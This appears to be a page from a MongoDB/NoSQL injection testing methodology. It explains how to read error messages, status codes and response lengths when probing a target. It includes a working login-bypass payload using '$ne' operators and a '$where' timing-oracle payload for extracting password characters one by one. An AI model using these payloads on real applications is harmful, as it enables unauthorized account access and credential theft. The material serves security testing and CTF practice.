# Error analysis — reading the responses

## The `MongoServerError` — the driver complained

```text
MongoServerError: unknown operator: $foo
MongoServerError: BadValue $where is not allowed
MongoServerError: $regex has to be a string
MongoServerError: Failed to parse objectId
MongoServerError: type mismatch
```

The driver echoes the operator — `unknown operator: $foo` proves the
object reached the query — `confirms`-adjacent evidence, still need a
read-back for the class — `evidence-rules.md`.

## The `CastError` — mongoose's coercion

```text
CastError: Cast to string failed for value {"$ne":null} at path "user"
CastError: Cast to ObjectId failed
```

`CastError` — mongoose's type-coercion rejected the object — the field
is schema-typed `String`/`ObjectId` — `denies` for that field, try a
non-typed field or a different carrier — `mongo-specific.md`.

## The `ValidationError` — mongoose's validator

```text
ValidationError: user is required
ValidationError: user must be a string
```

The schema-validator rejected the object — `denies`.

## The `400` — the app-level rejection

```text
{"error":"invalid input"}
{"error":"username must be a string"}
```

The app type-checked — `denies` — `denied-conditions.md`.

## The `302`/`200` — the bypass shape

```text
POST /login {"user":{"$ne":null},"pass":{"$ne":null}} → 302 /dashboard
POST /login {"user":{"$ne":null},"pass":{"$ne":null}} → {"token":"...","user":{"role":"admin"}}
```

A `302`/token/`role:admin` — the bypass's evidence — but read back the
protected endpoint to prove the identity — `auth-bypass.md`.

## The `[]`/empty — the no-match

```json
[]
{"data":[]}
{"users":[]}
```

An empty result — the filter matched nothing — `inconclusive` — the
operator ran but no doc matched — `detection.md`.

## The `500` — the crash

```text
500 Internal Server Error
{"error":"Cannot read property 'pass' of undefined"}
{"error":"the ObjectId is not valid"}
```

A `500` — the object crashed the app — `inconclusive` — the object
reached the code but the query threw — `detection.md`.

## The timeout — the timing-oracle

```text
$where: this.pass[0]=='f' ? sleep(3000) : true
```

A 3s delay — the timing-oracle — needs a 3x-jitter baseline and 2+
repeaters — `extraction.md`.

## The `$where` `this` — the doc-context

```text
{"error":"Cannot read property 'pass' of undefined"}
```

`this.pass` — `this` is the doc — a missing field → `undefined` —
`operators-js.md`.

## The `qs` parse — the carrier-check

```javascript
// user[$ne]=x → {user: {$ne: "x"}}    — extended:true
// user[$ne]=x → {"user[$ne]": "x"}    — extended:false
```

`extended` decides — `injection-points.md`.

## The response-diff — the oracle-read

```text
baseline:  {"users":[{...}]}          — len 456
probe:     {"users":[]}                — len 12
```

The length-diff — `detection.md` — the oracle.

## The `$unionWith` — the collection-name

```text
{"error":"Collection flag does not exist"}
{"users":[{...},{"flag":"flag{...}"}]}
```

`aggregation.md` — the collection exists-check.
